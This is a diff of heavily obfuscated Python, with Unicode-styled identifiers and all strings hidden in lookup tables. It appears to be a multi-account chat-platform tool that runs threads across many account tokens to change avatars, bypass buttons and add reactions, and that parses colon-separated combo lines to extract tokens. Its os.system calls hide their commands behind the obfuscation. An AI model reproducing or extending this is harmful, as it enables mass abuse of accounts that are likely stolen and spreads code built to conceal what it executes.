-            𝘵𝗵𝘳𝗲𝘢𝘥 = 𝙩𝘩𝗿𝗲𝙖𝙙𝘪𝘯𝘨.Thread(target=𝙛𝘶𝗻𝗰, args=𝙖𝘳𝙜)
-            𝘵𝙝𝗿𝙚𝗮𝙙𝘀.append(𝘵𝘩𝗿𝘦𝙖𝙙)
-            𝘁𝗵𝙧𝘦𝗮𝗱.start()
-        for 𝙩𝘩𝙧𝘦𝘢𝗱 in 𝘵𝘩𝗿𝗲𝘢𝘥𝘀:
-            𝘁𝗵𝗿𝘦𝗮𝙙.join()
-        𝘱𝘳𝘪𝗻𝘁(𝙉𝙈𝘔𝙈𝙉𝙡𝘭𝗠𝙈𝘭𝙈𝘔𝘕𝘭𝙄𝗠𝗜𝘐𝗡𝙈𝗜𝘐𝗠𝗜𝗹𝗜𝗡𝗜𝗠𝗜𝘐𝗠[363])
-        𝗼𝙨.system(𝗡𝗠𝗠𝙈𝗡𝙡𝘭𝗠𝙈𝗹𝗠𝙈𝗡𝘭𝗜𝗠𝗜𝘐𝘕𝗠𝘐𝙄𝙈𝙄𝗹𝘐𝙉𝘐𝙈𝘐𝗜𝙈[364])
-        𝘴𝙚𝘭𝘧.main_menu()
+        𝘵𝙝𝙧𝙚𝘢𝘥𝘴 = []
+        𝘤𝗼𝙣𝘴𝙤𝗹𝗲.render_ascii()
+        for 𝙖𝙧𝗴 in 𝙖𝘳𝘨𝘀:
+            𝙩𝙝𝗿𝘦𝘢𝙙 = 𝙩𝘩𝘳𝘦𝘢𝘥𝘪𝗻𝘨.Thread(target=𝙛𝘂𝗻𝙘, args=𝙖𝗿𝗴)
+            𝙩𝙝𝘳𝗲𝙖𝙙𝘀.append(𝘵𝙝𝙧𝘦𝘢𝗱)
+            𝘵𝗵𝙧𝘦𝙖𝗱.start()
+        for 𝘁𝗵𝘳𝙚𝙖𝗱 in 𝘁𝘩𝗿𝙚𝗮𝗱𝘴:
+            𝙩𝙝𝘳𝗲𝗮𝘥.join()
+        𝘱𝘳𝙞𝗻𝘵(𝗜𝗡𝙄𝘕𝗹𝘭𝙄𝗠𝙄𝗜𝗹𝙈𝘭𝘭𝙄𝗹𝙡𝘕𝙉𝗜𝘭𝙡𝗠𝗡𝗹𝗡𝘭𝘔𝘐𝗠𝗜𝙈[356])
+        𝙤𝙨.system(𝙄𝙉𝘐𝙉𝗹𝗹𝗜𝘔𝘐𝙄𝘭𝙈𝘭𝘭𝘐𝘭𝘭𝗡𝙉𝙄𝗹𝘭𝗠𝙉𝗹𝗡𝙡𝘔𝘐𝙈𝘐𝙈[357])
+        𝙨𝘦𝗹𝙛.main_menu()
 
-    @𝘸𝘳𝘢𝙥𝗽𝘦𝙧
+    @𝘸𝘳𝗮𝙥𝘱𝗲𝘳
     def avatar(self):
-        𝗼𝘀.system(𝗡𝗠𝗠𝘔𝘕𝙡𝗹𝘔𝙈𝙡𝗠𝙈𝘕𝘭𝗜𝙈𝙄𝗜𝙉𝗠𝗜𝙄𝘔𝗜𝗹𝗜𝘕𝙄𝘔𝘐𝗜𝙈[365])
-        𝙤𝘀.system(𝙉𝙈𝗠𝗠𝗡𝙡𝙡𝙈𝗠𝙡𝗠𝙈𝙉𝗹𝘐𝘔𝗜𝗜𝘕𝙈𝘐𝙄𝗠𝗜𝘭𝘐𝙉𝘐𝘔𝙄𝗜𝘔[1])
-        𝗽𝘳𝙞𝘯𝙩(𝗺𝗲𝘯𝘂)
-        for 𝘁𝙤𝘬𝘦𝘯 in 𝘁𝗼𝙠𝙚𝗻𝘀:
-            𝙩𝘩𝙧𝙚𝘢𝗱𝘪𝗻𝗴.Thread(target=𝗮𝘃𝙖𝙩𝘢𝘳_𝗰𝘩𝘢𝗻𝘨𝙚𝘳, args=𝘵𝗼𝙠𝗲𝙣).start()
-        𝗲𝘅𝗶𝘁 = 𝘪𝘯𝘱𝘂𝘵(𝙉𝗠𝙈𝙈𝙉𝙡𝙡𝗠𝙈𝘭𝙈𝗠𝗡𝙡𝙄𝙈𝘐𝗜𝘕𝗠𝘐𝘐𝘔𝗜𝙡𝙄𝗡𝘐𝘔𝘐𝙄𝙈[29])
-        𝘦𝘹𝙞𝘁 = 𝙈𝘦𝙣𝘂().main_menu()
-        𝘦𝘹𝘪𝘁()
+        𝘰𝘴.system(𝙄𝘕𝙄𝘕𝘭𝙡𝗜𝗠𝙄𝙄𝗹𝘔𝗹𝘭𝙄𝘭𝙡𝗡𝙉𝘐𝙡𝙡𝙈𝙉𝙡𝗡𝙡𝗠𝙄𝘔𝙄𝘔[358])
+        𝙤𝘴.system(𝙄𝗡𝘐𝗡𝗹𝙡𝗜𝙈𝗜𝘐𝙡𝘔𝙡𝙡𝘐𝘭𝙡𝙉𝗡𝙄𝙡𝘭𝘔𝙉𝙡𝘕𝗹𝗠𝗜𝙈𝗜𝙈[1])
+        𝙥𝘳𝗶𝗻𝘁(𝗺𝗲𝙣𝘶)
+        for 𝙩𝙤𝙠𝗲𝘯 in 𝙩𝗼𝙠𝗲𝘯𝙨:
+            𝘵𝙝𝘳𝘦𝗮𝘥𝙞𝗻𝘨.Thread(target=𝙖𝘃𝗮𝘁𝗮𝗿_𝙘𝘩𝘢𝙣𝙜𝙚𝗿, args=𝙩𝙤𝘬𝙚𝙣).start()
+        𝙚𝘹𝘪𝘵 = 𝗶𝗻𝘱𝙪𝘵(𝙄𝙉𝗜𝗡𝙡𝙡𝘐𝗠𝗜𝘐𝙡𝙈𝘭𝘭𝗜𝙡𝘭𝙉𝙉𝗜𝗹𝗹𝙈𝗡𝘭𝙉𝘭𝘔𝙄𝙈𝙄𝘔[22])
+        𝗲𝘹𝗶𝘵 = 𝗠𝘦𝗻𝙪().main_menu()
+        𝗲𝘹𝘪𝙩()
 
-    @𝘄𝘳𝘢𝙥𝗽𝗲𝘳
+    @𝘄𝗿𝙖𝙥𝘱𝘦𝗿
     def formater(self):
-        𝙤𝙨.system(𝘕𝙈𝘔𝘔𝘕𝙡𝙡𝙈𝙈𝘭𝙈𝙈𝗡𝙡𝙄𝙈𝘐𝙄𝘕𝙈𝗜𝗜𝘔𝙄𝘭𝗜𝗡𝗜𝙈𝘐𝘐𝘔[366])
+        𝙤𝘀.system(𝘐𝘕𝘐𝘕𝙡𝗹𝙄𝙈𝙄𝗜𝙡𝙈𝗹𝘭𝗜𝘭𝙡𝘕𝘕𝗜𝘭𝙡𝗠𝘕𝙡𝗡𝘭𝗠𝙄𝘔𝗜𝗠[359])
         try:
-            𝗰𝗹𝙚𝙖𝘯 = []
-            𝙤𝘴.system(𝘕𝙈𝙈𝘔𝗡𝙡𝗹𝗠𝗠𝗹𝗠𝙈𝗡𝗹𝗜𝘔𝗜𝙄𝘕𝙈𝗜𝘐𝗠𝗜𝗹𝗜𝗡𝘐𝗠𝙄𝘐𝙈[1])
-            𝗽𝗿𝘪𝙣𝘵(𝙢𝘦𝘯𝘶)
-            with 𝙤𝗽𝙚𝙣(𝗡𝗠𝘔𝙈𝘕𝗹𝙡𝘔𝘔𝘭𝙈𝘔𝙉𝗹𝘐𝙈𝗜𝗜𝘕𝘔𝙄𝗜𝙈𝙄𝙡𝙄𝗡𝗜𝙈𝘐𝗜𝗠[66], 𝗡𝗠𝗠𝙈𝙉𝗹𝙡𝘔𝙈𝗹𝘔𝗠𝘕𝙡𝙄𝘔𝙄𝗜𝙉𝙈𝗜𝙄𝙈𝘐𝘭𝘐𝙉𝗜𝙈𝘐𝘐𝙈[37]) as 𝘧:
-                𝙡𝘪𝘯𝙚𝘀 = 𝘧.read().splitlines()
-                for 𝙡𝗶𝘯𝗲 in 𝙡𝘪𝘯𝙚𝙨:
-                    𝘴𝙥𝗹𝘪𝙩 = 𝗹𝗶𝙣𝙚.split(𝗡𝘔𝗠𝘔𝗡𝙡𝗹𝘔𝘔𝗹𝙈𝙈𝗡𝘭𝘐𝗠𝘐𝗜𝘕𝙈𝗜𝗜𝙈𝗜𝘭𝗜𝘕𝗜𝗠𝙄𝗜𝙈[367])
-                    𝙘𝘭𝙚𝘢𝙣.append(𝙨𝗽𝙡𝗶𝘁[2])
-            with 𝙤𝙥𝙚𝗻(𝗡𝙈𝗠𝗠𝘕𝘭𝗹𝗠𝙈𝗹𝘔𝙈𝙉𝙡𝙄𝗠𝗜𝗜𝙉𝘔𝘐𝗜𝙈𝗜𝗹𝙄𝗡𝗜𝘔𝙄𝙄𝗠[66], 𝙉𝘔𝘔𝙈𝘕𝗹𝘭𝙈𝙈𝘭𝘔𝙈𝘕𝙡𝗜𝘔𝗜𝙄𝗡𝙈𝙄𝗜𝗠𝗜𝘭𝙄𝙉𝘐𝘔𝙄𝘐𝙈[28]) as 𝗳:
-                for 𝙩𝘰𝘬𝙚𝘯 in 𝙘𝙡𝙚𝘢𝗻:
-                    𝙛.write(f'{𝘁𝘰𝙠𝙚𝙣}{𝘕𝗠𝗠𝘔𝘕𝗹𝘭𝗠𝙈𝙡𝘔𝘔𝙉𝗹𝗜𝗠𝗜𝗜𝘕𝗠𝘐𝘐𝘔𝘐𝙡𝘐𝗡𝙄𝗠𝘐𝘐𝗠[70]}')
-            𝙥𝙧𝙞𝙣𝘁(f'{𝗿}{𝗡𝙈𝘔𝗠𝙉𝙡𝘭𝗠𝘔𝘭𝗠𝙈𝙉𝘭𝗜𝙈𝙄𝗜𝗡𝗠𝗜𝘐𝘔𝙄𝘭𝙄𝙉𝙄𝘔𝘐𝗜𝗠[98]}{𝙡𝙘}{𝗡𝙈𝗠𝘔𝘕𝗹𝗹𝗠𝘔𝙡𝙈𝗠𝙉𝘭𝗜𝙈𝗜𝘐𝙉𝗠𝙄𝘐𝙈𝘐𝗹𝘐𝙉𝗜𝗠𝗜𝗜𝙈[368]}{𝘳}{𝘕𝘔𝗠𝗠𝗡𝗹𝘭𝙈𝗠𝙡𝘔𝗠𝗡𝗹𝗜𝙈𝙄𝙄𝗡𝘔𝘐𝗜𝗠𝗜𝘭𝙄𝗡𝙄𝙈𝘐𝗜𝗠[369]}{𝘭𝘤}{𝙡𝘦𝘯(𝘁𝗼𝗸𝙚𝘯𝙨)}{𝗿}{𝘕𝗠𝗠𝙈𝙉𝘭𝗹𝗠𝙈𝗹𝙈𝘔𝙉𝗹𝗜𝘔𝘐𝘐𝙉𝗠𝘐𝗜𝘔𝗜𝘭𝙄𝘕𝙄𝘔𝙄𝘐𝘔[370]}')
+            𝗰𝙡𝙚𝘢𝗻 = []
+            𝗼𝙨.system(𝘐𝗡𝙄𝗡𝗹𝙡𝘐𝗠𝘐𝗜𝙡𝗠𝗹𝘭𝘐𝘭𝙡𝙉𝗡𝘐𝙡𝘭𝙈𝘕𝙡𝙉𝙡𝙈𝙄𝙈𝘐𝘔[1])
+            𝙥𝗿𝘪𝗻𝙩(𝗺𝗲𝗻𝙪)
+            with 𝗼𝙥𝙚𝙣(𝘐𝘕𝗜𝘕𝗹𝙡𝗜𝘔𝙄𝗜𝘭𝗠𝙡𝘭𝙄𝙡𝙡𝗡𝘕𝙄𝙡𝘭𝗠𝘕𝙡𝙉𝗹𝙈𝙄𝙈𝗜𝘔[59], 𝗜𝗡𝗜𝘕𝘭𝘭𝙄𝘔𝘐𝙄𝗹𝘔𝙡𝘭𝙄𝙡𝙡𝗡𝗡𝗜𝗹𝗹𝘔𝗡𝙡𝘕𝗹𝗠𝙄𝗠𝘐𝗠[30]) as 𝗳:
+                𝗹𝙞𝙣𝗲𝘀 = 𝗳.read().splitlines()
+                for 𝙡𝗶𝗻𝘦 in 𝘭𝘪𝙣𝙚𝘴:
+                    𝘴𝗽𝗹𝘪𝙩 = 𝘭𝗶𝙣𝙚.split(𝘐𝙉𝘐𝘕𝘭𝗹𝘐𝙈𝙄𝘐𝘭𝙈𝗹𝘭𝙄𝗹𝘭𝘕𝗡𝙄𝙡𝗹𝙈𝙉𝙡𝙉𝘭𝗠𝙄𝙈𝘐𝙈[360])
+                    𝘤𝙡𝗲𝘢𝗻.append(𝘴𝘱𝙡𝙞𝘵[2])
+            with 𝙤𝗽𝘦𝗻(𝗜𝘕𝘐𝘕𝙡𝘭𝙄𝗠𝗜𝙄𝙡𝘔𝘭𝗹𝙄𝘭𝘭𝘕𝘕𝙄𝙡𝘭𝘔𝘕𝗹𝘕𝙡𝗠𝘐𝙈𝘐𝙈[59], 𝗜𝘕𝘐𝗡𝘭𝗹𝙄𝙈𝘐𝗜𝙡𝗠𝗹𝗹𝙄𝘭𝗹𝙉𝗡𝘐𝘭𝗹𝙈𝙉𝙡𝗡𝙡𝙈𝘐𝘔𝗜𝗠[21]) as 𝙛:
+                for 𝙩𝙤𝗸𝙚𝘯 in 𝙘𝙡𝗲𝘢𝘯:
+                    𝗳.write(f'{𝙩𝘰𝗸𝗲𝘯}{𝙄𝗡𝘐𝗡𝘭𝙡𝘐𝘔𝙄𝗜𝙡𝘔𝗹𝙡𝘐𝙡𝗹𝙉𝘕𝙄𝗹𝗹𝗠𝘕𝗹𝙉𝘭𝙈𝙄𝘔𝗜𝘔[63]}')
+            𝘱𝗿𝗶𝙣𝙩(f'{𝘳}{𝗜𝙉𝙄𝗡𝘭𝗹𝙄𝗠𝙄𝘐𝙡𝘔𝙡𝙡𝘐𝙡𝘭𝘕𝗡𝘐𝘭𝘭𝙈𝘕𝗹𝗡𝗹𝙈𝗜𝙈𝙄𝙈[91]}{𝘭𝗰}{𝘐𝗡𝙄𝗡𝘭𝗹𝘐𝗠𝗜𝙄𝗹𝗠𝗹𝗹𝘐𝙡𝗹𝙉𝘕𝘐𝙡𝘭𝗠𝙉𝗹𝙉𝙡𝗠𝘐𝙈𝙄𝙈[361]}{𝗿}{𝘐𝘕𝙄𝘕𝘭𝗹𝗜𝗠𝗜𝘐𝙡𝘔𝗹𝙡𝘐𝘭𝗹𝙉𝗡𝗜𝗹𝗹𝘔𝘕𝘭𝙉𝙡𝘔𝙄𝗠𝗜𝙈[362]}{𝘭𝙘}{𝙡𝗲𝙣(𝙩𝙤𝘬𝘦𝙣𝙨)}{𝙧}{𝘐𝘕𝗜𝙉𝘭𝗹𝙄𝘔𝗜𝘐𝗹𝗠𝗹𝗹𝙄𝙡𝘭𝘕𝘕𝘐𝙡𝘭𝙈𝗡𝘭𝘕𝗹𝘔𝘐𝘔𝘐𝗠[363]}')
         except:
             pass
-        𝘦𝘹𝙞𝘵 = 𝗶𝘯𝗽𝘂𝘁(𝘕𝗠𝙈𝘔𝙉𝙡𝙡𝙈𝗠𝘭𝙈𝗠𝘕𝙡𝗜𝙈𝙄𝙄𝘕𝘔𝗜𝙄𝗠𝘐𝘭𝘐𝘕𝘐𝘔𝗜𝙄𝙈[29])
-        𝙚𝘹𝙞𝘁 = 𝗠𝙚𝗻𝘂().main_menu()
-        𝙚𝘅𝘪𝘁()
+        𝗲𝘅𝘪𝘵 = 𝙞𝘯𝗽𝘂𝘁(𝗜𝘕𝙄𝗡𝘭𝗹𝗜𝘔𝘐𝙄𝗹𝘔𝙡𝙡𝙄𝙡𝙡𝗡𝗡𝗜𝙡𝘭𝗠𝗡𝗹𝗡𝙡𝙈𝘐𝗠𝘐𝘔[22])
+        𝗲𝙭𝙞𝘁 = 𝙈𝘦𝙣𝘂().main_menu()
+        𝙚𝘹𝙞𝙩()
 
-    @𝙬𝘳𝙖𝙥𝗽𝗲𝙧
+    @𝘄𝙧𝙖𝘱𝙥𝙚𝗿
     def button_click(self):
-        𝙤𝘴.system(𝙉𝗠𝗠𝙈𝙉𝙡𝗹𝘔𝘔𝘭𝘔𝙈𝘕𝙡𝗜𝘔𝗜𝘐𝘕𝗠𝙄𝙄𝘔𝘐𝙡𝙄𝙉𝘐𝗠𝗜𝘐𝙈[97])
-        𝘮𝙚𝘀𝘀𝙖𝗴𝗲𝙡𝗶𝘯𝙠 = 𝙞𝙣𝗽𝘂𝘵(f'{𝘳}{𝘕𝙈𝘔𝗠𝙉𝙡𝙡𝙈𝗠𝗹𝘔𝙈𝘕𝘭𝗜𝗠𝗜𝗜𝘕𝗠𝙄𝗜𝙈𝘐𝙡𝗜𝗡𝗜𝙈𝙄𝙄𝘔[98]}{𝘭𝙘}{𝘕𝙈𝙈𝙈𝗡𝗹𝘭𝗠𝗠𝘭𝙈𝗠𝗡𝘭𝙄𝗠𝗜𝘐𝙉𝘔𝗜𝙄𝗠𝙄𝗹𝙄𝙉𝗜𝗠𝘐𝗜𝙈[371]}{𝙧}{𝙉𝗠𝗠𝙈𝗡𝘭𝙡𝙈𝙈𝘭𝗠𝘔𝗡𝙡𝙄𝙈𝗜𝙄𝘕𝘔𝘐𝘐𝙈𝘐𝙡𝗜𝘕𝙄𝗠𝙄𝙄𝙈[372]}')
-        𝗽𝙧𝗶𝙣𝘵(f'{𝗿}{𝙉𝗠𝗠𝙈𝘕𝗹𝘭𝙈𝙈𝗹𝙈𝘔𝘕𝗹𝘐𝙈𝘐𝘐𝙉𝘔𝗜𝙄𝗠𝗜𝙡𝗜𝘕𝙄𝗠𝘐𝗜𝙈[373]}{𝗹𝗰}{𝙉𝙈𝘔𝗠𝙉𝗹𝙡𝘔𝙈𝗹𝗠𝙈𝙉𝗹𝘐𝗠𝙄𝗜𝘕𝙈𝗜𝙄𝘔𝗜𝙡𝙄𝗡𝙄𝘔𝗜𝙄𝗠[238]}{𝙧}{𝗡𝗠𝗠𝗠𝙉𝗹𝘭𝘔𝙈𝘭𝗠𝘔𝙉𝗹𝗜𝗠𝗜𝘐𝘕𝙈𝙄𝗜𝗠𝘐𝙡𝙄𝘕𝗜𝘔𝘐𝘐𝘔[374]}')
-        𝗯𝙪𝙩𝙩𝗼𝗻𝗼𝗽𝘁𝙞𝗼𝗻 = 𝙞𝘯𝘱𝙪𝘁(f'{𝙧}{𝗡𝙈𝙈𝙈𝙉𝘭𝙡𝗠𝗠𝘭𝗠𝙈𝗡𝘭𝘐𝙈𝙄𝙄𝙉𝗠𝙄𝘐𝗠𝘐𝗹𝘐𝙉𝘐𝘔𝙄𝗜𝙈[98]}{𝗹𝗰}{𝗡𝙈𝙈𝗠𝙉𝘭𝗹𝗠𝗠𝙡𝙈𝙈𝗡𝘭𝗜𝙈𝘐𝗜𝗡𝙈𝙄𝗜𝘔𝙄𝙡𝘐𝙉𝗜𝘔𝘐𝙄𝘔[375]}{𝗿}{𝘕𝘔𝗠𝘔𝘕𝘭𝙡𝘔𝗠𝙡𝙈𝗠𝙉𝗹𝘐𝗠𝘐𝙄𝗡𝗠𝙄𝗜𝗠𝙄𝙡𝗜𝘕𝘐𝙈𝗜𝘐𝙈[372]}')
-        𝙤𝙨.system(𝘕𝗠𝗠𝗠𝘕𝘭𝙡𝗠𝙈𝗹𝘔𝗠𝙉𝗹𝗜𝘔𝗜𝘐𝙉𝙈𝙄𝙄𝙈𝗜𝙡𝗜𝙉𝗜𝙈𝗜𝘐𝙈[1])
-        𝙥𝗿𝘪𝘯𝘁(𝗺𝗲𝘯𝘂)
-        for 𝘁𝗼𝗸𝗲𝙣 in 𝙩𝙤𝘬𝙚𝙣𝙨:
-            𝘵𝘩𝙧𝗲𝙖𝙙𝘪𝗻𝙜.Thread(target=𝗯𝘂𝘁𝙩𝙤𝘯_𝘣𝘺𝘱𝗮𝙨𝘀, args=(𝘵𝙤𝙠𝙚𝘯, 𝗺𝙚𝘴𝘀𝗮𝘨𝘦𝘭𝗶𝗻𝘬, 𝗯𝘂𝘵𝘵𝘰𝗻𝗼𝙥𝘵𝙞𝘰𝗻)).start()
-        𝙚𝘅𝘪𝘵 = 𝙞𝙣𝙥𝘂𝙩(𝗡𝗠𝙈𝘔𝘕𝙡𝘭𝗠𝙈𝗹𝗠𝙈𝗡𝗹𝗜𝘔𝘐𝗜𝙉𝙈𝗜𝙄𝗠𝙄𝙡𝘐𝗡𝘐𝙈𝘐𝗜𝙈[29])
-        𝙚𝘹𝙞𝘵 = 𝘔𝙚𝗻𝙪().main_menu()
-        𝘦𝘹𝘪𝘁()
-
-    @𝘸𝙧𝗮𝙥𝘱𝗲𝙧
-    def reactor(self):
-        𝙤𝘴.system(𝘕𝗠𝗠𝙈𝘕𝘭𝘭𝗠𝗠𝘭𝗠𝙈𝘕𝙡𝘐𝗠𝗜𝗜𝘕𝗠𝙄𝙄𝗠𝙄𝘭𝗜𝙉𝙄𝗠𝙄𝘐𝘔[97])
-        𝘮𝗲𝘴𝙨𝗮𝘨𝙚_𝙡𝘪𝘯𝙠 = 𝗶𝗻𝙥𝘶𝘁(f'{𝗿}{𝗡𝙈𝙈𝙈𝗡𝘭𝘭𝗠𝗠𝘭𝙈𝗠𝙉𝘭𝗜𝘔𝗜𝙄𝗡𝙈𝘐𝙄𝗠𝘐𝘭𝘐𝙉𝘐𝘔𝘐𝘐𝗠[98]}{𝘭𝗰}{𝙉𝗠𝙈𝙈𝘕𝘭𝘭𝘔𝗠𝘭𝗠𝗠𝘕𝗹𝗜𝙈𝙄𝙄𝗡𝗠𝘐𝗜𝗠𝗜𝙡𝘐𝙉𝙄𝗠𝙄𝙄𝙈[371]}{𝙧}{𝗡𝗠𝗠𝙈𝙉𝙡𝘭𝘔𝙈𝘭𝗠𝘔𝘕𝗹𝘐𝙈𝘐𝗜𝙉𝘔𝙄𝗜𝘔𝘐𝗹𝗜𝗡𝙄𝙈𝗜𝘐𝘔[372]}')
-        if 𝙢𝘦𝘀𝘴𝘢𝘨𝗲_𝘭𝘪𝙣𝗸 == 𝙉𝙈𝗠𝙈𝙉𝘭𝗹𝘔𝘔𝘭𝘔𝗠𝗡𝙡𝘐𝗠𝘐𝘐𝙉𝙈𝗜𝗜𝘔𝙄𝘭𝘐𝗡𝘐𝗠𝘐𝙄𝙈[29]:
-            𝗠𝘦𝗻𝙪().main_menu()
-        𝘱𝘳𝙞𝗻𝙩(f'{𝘳}{𝙉𝗠𝘔𝗠𝙉𝙡𝙡𝗠𝘔𝘭𝘔𝘔𝙉𝗹𝘐𝙈𝘐𝗜𝙉𝗠𝘐𝗜𝘔𝘐𝗹𝙄𝙉𝘐𝘔𝗜𝘐𝙈[376]}{𝗹𝙘}{𝗡𝘔𝙈𝙈𝙉𝙡𝙡𝘔𝗠𝗹𝙈𝘔𝘕𝘭𝘐𝗠𝙄𝗜𝘕𝗠𝗜𝗜𝗠𝗜𝘭𝘐𝙉𝙄𝙈𝘐𝗜𝗠[238]}{𝗿}{𝘕𝘔𝗠𝗠𝘕𝘭𝗹𝙈𝘔𝘭𝙈𝘔𝗡𝘭𝙄𝗠𝙄𝗜𝙉𝘔𝗜𝗜𝗠𝗜𝘭𝗜𝘕𝘐𝙈𝘐𝗜𝘔[377]}')
-        𝗿𝙚𝘢𝗰𝘵𝘪𝗼𝗻 = 𝙞𝘯𝘱𝙪𝘵(f'{𝙧}{𝘕𝗠𝘔𝘔𝙉𝗹𝙡𝙈𝘔𝘭𝘔𝙈𝙉𝙡𝘐𝗠𝙄𝘐𝗡𝙈𝘐𝙄𝙈𝗜𝙡𝗜𝙉𝙄𝙈𝗜𝙄𝘔[98]}{𝙡𝘤}{𝘕𝘔𝙈𝗠𝗡𝘭𝗹𝘔𝙈𝘭𝙈𝗠𝙉𝘭𝘐𝗠𝘐𝙄𝗡𝘔𝘐𝗜𝗠𝙄𝙡𝘐𝘕𝗜𝘔𝘐𝗜𝘔[378]}{𝘳}{𝙉𝗠𝗠𝘔𝘕𝗹𝗹𝙈𝙈𝘭𝙈𝘔𝘕𝗹𝗜𝘔𝗜𝗜𝗡𝗠𝘐𝗜𝙈𝗜𝘭𝘐𝙉𝙄𝘔𝘐𝗜𝙈[372]}')
-        if 𝙧𝘦𝘢𝘤𝘁𝗶𝘰𝗻 == 𝘕𝘔𝙈𝘔𝘕𝙡𝘭𝙈𝘔𝘭𝗠𝙈𝗡𝘭𝙄𝙈𝗜𝗜𝙉𝗠𝗜𝙄𝘔𝙄𝘭𝗜𝘕𝘐𝙈𝘐𝗜𝘔[29]:
-            𝗠𝙚𝙣𝙪().main_menu()
-        𝙤𝘴.system(𝘕𝙈𝙈𝙈𝙉𝗹𝗹𝙈𝙈𝘭𝙈𝙈𝘕𝘭𝘐𝗠𝙄𝗜𝙉𝗠𝗜𝙄𝘔𝙄𝘭𝙄𝙉𝗜𝘔𝘐𝘐𝙈[1])
-        𝙥𝙧𝗶𝗻𝘁(𝘮𝙚𝘯𝘶)
-        for 𝙩𝙤𝘬𝘦𝙣 in 𝘁𝗼𝘬𝗲𝗻𝘴:
-            𝙩𝗵𝙧𝙚𝙖𝘥𝙞𝙣𝙜.Thread(target=𝙧𝙚𝙖𝗰𝘁𝘰𝙧, args=(𝙩𝙤𝙠𝗲𝙣, 𝗿𝗲𝗮𝗰𝘵𝗶𝙤𝗻, 𝙢𝙚𝘴𝙨𝗮𝗴𝗲_𝙡𝙞𝙣𝙠)).start()
-        𝗲𝙭𝘪𝘁 = 𝘪𝙣𝗽𝘂𝘵(𝘕𝗠𝘔𝗠𝘕𝘭𝘭𝘔𝗠𝙡𝗠𝙈𝘕𝘭𝗜𝗠𝘐𝘐𝙉𝗠𝘐𝙄𝙈𝗜𝗹𝘐𝙉𝘐𝙈𝙄𝘐𝙈[29])
-        𝗲𝘅𝘪𝙩 = 𝗠𝘦𝗻𝘂().main_menu()
+        𝙤𝙨.system(𝙄𝙉𝗜𝙉𝙡𝘭𝙄𝙈𝗜𝘐𝗹𝙈𝙡𝙡𝘐𝘭𝗹𝗡𝘕𝙄𝙡𝙡𝙈𝘕𝗹𝙉𝗹𝙈𝘐𝗠𝙄𝗠[90])
+        𝙢𝗲𝘴𝘴𝗮𝘨𝗲𝗹𝘪𝗻𝙠 = 𝗶𝘯𝘱𝘂𝘵(f'{𝙧}{𝘐𝗡𝙄𝙉𝗹𝘭𝘐𝗠𝘐𝙄𝘭𝗠𝙡𝘭𝘐𝙡𝙡𝙉𝗡𝙄𝘭𝗹𝗠𝗡𝗹𝗡𝘭𝘔𝗜𝙈𝙄𝙈[91]}{𝘭𝘤}{𝘐𝙉𝘐𝘕𝗹𝗹𝙄𝘔𝘐𝗜𝘭𝘔𝘭𝗹𝗜𝙡𝗹𝗡𝙉𝗜𝙡𝘭𝗠𝗡𝗹𝙉𝙡𝙈𝙄𝙈𝙄𝗠[364]}{𝙧}{𝘐𝗡𝗜𝘕𝘭𝙡𝘐𝙈𝙄𝙄𝗹𝗠𝙡𝗹𝙄𝗹𝘭𝗡𝗡𝘐𝘭𝙡𝘔𝙉𝗹𝗡𝙡𝗠𝙄𝘔𝙄𝘔[365]}')
+        𝘱𝗿𝙞𝙣𝘁(f'{𝘳}{𝙄𝗡𝘐𝙉𝘭𝗹𝗜𝘔𝗜𝙄𝘭𝙈𝘭𝘭𝙄𝗹𝘭𝘕𝙉𝘐𝙡𝗹𝙈𝙉𝙡𝙉𝙡𝙈𝙄𝘔𝗜𝙈[366]}{𝗹𝘤}{𝗜𝗡𝘐𝙉𝙡𝙡𝘐𝗠𝘐𝘐𝙡𝗠𝘭𝘭𝘐𝙡𝙡𝙉𝗡𝘐𝙡𝙡𝗠𝘕𝘭𝗡𝙡𝙈𝘐𝘔𝘐𝘔[231]}{𝘳}{𝘐𝗡𝘐𝙉𝗹𝙡𝙄𝙈𝗜𝘐𝘭𝘔𝗹𝙡𝘐𝙡𝗹𝙉𝘕𝘐𝙡𝘭𝙈𝙉𝙡𝗡𝗹𝘔𝗜𝘔𝘐𝗠[367]}')
+        𝘣𝘶𝙩𝙩𝘰𝗻𝗼𝗽𝘵𝘪𝗼𝘯 = 𝘪𝘯𝙥𝙪𝙩(f'{𝗿}{𝘐𝘕𝘐𝗡𝙡𝘭𝙄𝙈𝗜𝙄𝘭𝙈𝘭𝗹𝗜𝘭𝙡𝘕𝗡𝙄𝗹𝙡𝗠𝗡𝗹𝙉𝘭𝘔𝙄𝙈𝙄𝘔[91]}{𝙡𝘤}{𝙄𝘕𝗜𝘕𝗹𝗹𝙄𝗠𝘐𝗜𝗹𝘔𝘭𝙡𝙄𝙡𝗹𝗡𝙉𝗜𝗹𝗹𝗠𝙉𝘭𝙉𝗹𝗠𝙄𝙈𝘐𝙈[368]}{𝗿}{𝙄𝗡𝙄𝙉𝗹𝘭𝗜𝘔𝗜𝘐𝘭𝗠𝘭𝗹𝘐𝗹𝘭𝗡𝙉𝙄𝘭𝙡𝗠𝘕𝙡𝗡𝗹𝘔𝙄𝗠𝘐𝗠[365]}')
+        𝗼𝙨.system(𝙄𝗡𝙄𝗡𝗹𝙡𝘐𝘔𝘐𝗜𝙡𝙈𝘭𝗹𝘐𝘭𝗹𝗡𝘕𝙄𝙡𝗹𝗠𝗡𝘭𝘕𝘭𝘔𝘐𝘔𝘐𝗠[1])
+        𝗽𝘳𝘪𝙣𝘵(𝗺𝘦𝗻𝘶)
+        for 𝘁𝙤𝘬𝗲𝗻 in 𝙩𝗼𝘬𝘦𝙣𝙨:
+            𝘵𝘩𝗿𝙚𝗮𝙙𝙞𝗻𝘨.Thread(target=𝙗𝙪𝙩𝘵𝙤𝗻_𝙗𝘆𝙥𝗮𝙨𝘀, args=(𝘁𝙤𝗸𝘦𝘯, 𝘮𝗲𝘴𝘀𝙖𝗴𝗲𝗹𝘪𝘯𝙠, 𝙗𝙪𝘵𝘵𝘰𝗻𝙤𝙥𝙩𝙞𝗼𝘯)).start()
+        𝗲𝙭𝗶𝘁 = 𝘪𝗻𝙥𝙪𝘵(𝗜𝙉𝘐𝘕𝗹𝘭𝙄𝙈𝗜𝙄𝘭𝙈𝙡𝗹𝙄𝗹𝗹𝘕𝙉𝙄𝙡𝙡𝗠𝘕𝘭𝗡𝗹𝙈𝗜𝗠𝘐𝙈[22])
+        𝗲𝘅𝗶𝘁 = 𝘔𝘦𝘯𝙪().main_menu()
         𝙚𝘅𝗶𝙩()
 
